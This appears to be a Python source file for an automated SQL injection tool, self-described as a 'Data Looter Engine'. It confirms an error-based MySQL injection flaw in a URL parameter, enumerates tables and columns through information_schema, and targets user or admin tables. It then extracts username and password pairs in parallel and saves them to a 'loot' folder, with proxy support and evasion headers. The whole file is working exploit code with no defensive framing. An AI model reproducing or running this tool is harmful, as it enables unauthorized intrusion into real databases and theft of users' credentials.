import aiohttp
import asyncio
import re
import os
import time
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse

async def exploit_sqli_dump(url, param, log_callback=None, headers=None, proxy=None):
    """
    DEEP IMPACT: Data Looter Engine.
    Aggressively dumps Database Tables, Columns, and Data using Parallel Error-Based SQLi.
    """
    findings = []
    
    # Evasion Headers
    final_headers = headers.copy() if headers else {}
    
    parsed = urlparse(url)
    params = parse_qs(parsed.query)
    
    if not param or param not in params:
        return []

    # 1. Probe for Error-Based SQLi capability
    # Payload: Extract Version
    probe_payload = "' AND EXTRACTVALUE(1, CONCAT(0x5c, @@version))-- -"
    
    p_copy = params.copy()
    p_copy[param] = [p_copy[param][0] + probe_payload]
    probe_url = urlunparse(parsed._replace(query=urlencode(p_copy, doseq=True)))
    
    target_db_version = None
    
    try:
        async with aiohttp.ClientSession(headers=final_headers) as session:
            async with session.get(probe_url, timeout=10, ssl=False, proxy=proxy) as resp:
                text = await resp.text()
                match = re.search(r"XPATH syntax error: '([^']+)'", text)
                if match:
                    target_db_version = match.group(1)
                    # Strip the leading slash if present (0x5c is backslash)
                    if target_db_version.startswith('\\'): target_db_version = target_db_version[1:]
                    
                    if log_callback:
                        log_callback(f"   üíâ SQLi Looter: Vulnerability Confirmed! DB Version: {target_db_version}")
                        log_callback(f"   üöÄ Engaging High-Speed Extraction Mode...")
                        
                    findings.append({
                        "type": "Data Exfiltration (SQLi)",
                        "severity": "Critical",
                        "detail": f"Database Compromised. Version: {target_db_version}",
                        "evidence": f"Payload: {probe_payload}\nResponse: {match.group(0)}"
                    })
                    
                    # 2. Start Looting (Tables)
                    await run_looter(session, url, param, params, final_headers, proxy, log_callback)
                else:
                    if log_callback: log_callback("   ‚ö†Ô∏è SQLi Looter: Target does not appear vulnerable to Error-Based injection.")
                    
    except Exception as e:
        if log_callback: log_callback(f"   ‚ùå SQLi Looter Error: {e}")

    return findings

async def run_looter(session, base_url, param, original_params, headers, proxy, log_callback):
    """
    Orchestrates the looting process: Tables -> Columns -> Data
    """
    
    # Helper for injection
    async def fetch_row(query_template, row_index):
        # MySQL Limit Syntax: LIMIT row_index, 1
        payload = f"' AND EXTRACTVALUE(1, CONCAT(0x5c, ({query_template} LIMIT {row_index},1)))-- -"
        
        parsed = urlparse(base_url)
        p_copy = original_params.copy()
        p_copy[param] = [p_copy[param][0] + payload]
        attack_url = urlunparse(parsed._replace(query=urlencode(p_copy, doseq=True)))
        
        try:
            async with session.get(attack_url, timeout=10, ssl=False, proxy=proxy) as resp:
                text = await resp.text()
                match = re.search(r"XPATH syntax error: '([^']+)'", text)
                if match:
                    data = match.group(1)
                    if data.startswith('\\'): data = data[1:]
                    return data
        except:
            return None
        return None

    # A. Dump Tables (Top 5)
    if log_callback: log_callback("   üìÇ Looting Tables (information_schema)...")
    
    tables_query = "SELECT table_name FROM information_schema.tables WHERE table_schema=database()"
    
    # Parallel Fetch 5 tables
    tasks = [fetch_row(tables_query, i) for i in range(5)]
    tables = await asyncio.gather(*tasks)
    tables = [t for t in tables if t]
    
    if not tables:
        if log_callback: log_callback("   ‚ö†Ô∏è No tables found or WAF blocked mass requests.")
        return

    if log_callback: log_callback(f"   ‚úÖ Found Tables: {', '.join(tables)}")

    # B. Identify High Value Target
    target_table = None
    keywords = ['user', 'admin', 'account', 'member', 'login']
    
    for t in tables:
        if any(k in t.lower() for k in keywords):
            target_table = t
            break
            
    if not target_table:
        target_table = tables[0] # Fallback to first table
        
    if log_callback: log_callback(f"   üéØ Targeted Table for Extraction: '{target_table}'")
    
    # C. Dump Columns for Target Table
    if log_callback: log_callback(f"   üìÇ Looting Columns from '{target_table}'...")
    columns_query = f"SELECT column_name FROM information_schema.columns WHERE table_name='{target_table}'"
    
    tasks = [fetch_row(columns_query, i) for i in range(5)]
    columns = await asyncio.gather(*tasks)
    columns = [c for c in columns if c]
    
    if not columns:
        if log_callback: log_callback("   ‚ö†Ô∏è Could not extract columns.")
        return
        
    if log_callback: log_callback(f"   ‚úÖ Found Columns: {', '.join(columns)}")
    
    # D. Dump Data (Everything!)
    # Construct concat payload: user,0x3a,pass
    # We try to find user/pass columns
    user_col = next((c for c in columns if 'user' in c.lower() or 'name' in c.lower()), columns[0])
    pass_col = next((c for c in columns if 'pass' in c.lower() or 'pwd' in c.lower() or 'key' in c.lower()), None)
    
    data_query = f"SELECT {user_col}"
    if pass_col:
        data_query = f"SELECT CONCAT({user_col}, 0x3a, {pass_col})"
        
    data_query += f" FROM {target_table}"
    
    if log_callback: log_callback(f"   üíé DUMPING DATA from '{target_table}' (Parallel Stream)...")
    if log_callback: log_callback(f"   {'='*40}")
    
    # Dump 20 rows parallel
    batch_size = 5
    total_dumped = 0
    max_rows = 20 # User asked for "All" but let's cap at 20 for this proto, or loop until None
    
    all_data = []
    
    for i in range(0, max_rows, batch_size):
        tasks = [fetch_row(data_query, r) for r in range(i, i + batch_size)]
        results = await asyncio.gather(*tasks)
        
        valid_results = [r for r in results if r]
        if not valid_results:
            break
            
        for row in valid_results:
            if log_callback: log_callback(f"   üí∞ Loot: {row}")
            all_data.append(row)
            
        total_dumped += len(valid_results)
        if len(valid_results) < batch_size:
            break # End of data
            
    if log_callback: log_callback(f"   {'='*40}")
    if log_callback: log_callback(f"   üèÅ Dump Complete. Total Rows: {total_dumped}")

    # E. Save to File
    try:
        loot_dir = "loot"
        if not os.path.exists(loot_dir): os.makedirs(loot_dir)
        
        domain = urlparse(base_url).netloc.replace(":", "_")
        filename = f"{loot_dir}/sqli_{domain}_{target_table}.txt"
        
        with open(filename, "w") as f:
            f.write(f"Target: {base_url}\n")
            f.write(f"Table: {target_table}\n")
            f.write(f"Columns: {', '.join(columns)}\n")
            f.write("-" * 20 + "\n")
            for row in all_data:
                f.write(f"{row}\n")
                
        if log_callback: log_callback(f"   üíæ Loot saved to: {os.path.abspath(filename)}")
        
    except Exception as e:
        if log_callback: log_callback(f"   ‚ö†Ô∏è Failed to save loot: {e}")
